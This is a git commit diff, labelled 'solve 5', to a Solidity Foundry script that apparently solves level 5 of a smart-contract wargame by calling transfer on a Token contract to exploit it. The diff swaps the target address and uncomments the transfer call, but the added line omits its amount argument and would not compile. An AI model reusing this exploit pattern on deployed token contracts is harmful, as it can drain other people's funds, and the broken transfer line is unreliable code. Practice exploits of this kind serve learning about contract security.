e619431f7b8078189862f87dff126cacb9d81043
Rob1nHust <nhhuy1311.work@gmail.com>
2026-02-01 23:16:35 +0700

    solve 5

--- scripts/Level5.s.sol
+++ scripts/Level5.s.sol
@@ -6,12 +6,12 @@ import "forge-std/Script.sol";
 import "forge-std/console.sol";
 
 contract Level5Solution {
-    Token public token = Token(0x57E28917505afE734f94076C24cce9EC63c7A240);
+    Token public token = Token(0xAd9D9c6fB86FB23be3aD482F1103C6B706517c7F);
 
 
     function attack() public {
 
-        // token.transfer(0xb8bB85fbc32AD54B4f4B5750E8501Ed4712F5d65, 19);
+        token.transfer(0xb8bB85fbc32AD54B4f4B5750E8501Ed4712F5d65, );
         // console.log(token.balanceOf(0xb8bB85fbc32AD54B4f4B5750E8501Ed4712F5d65));
 
     }
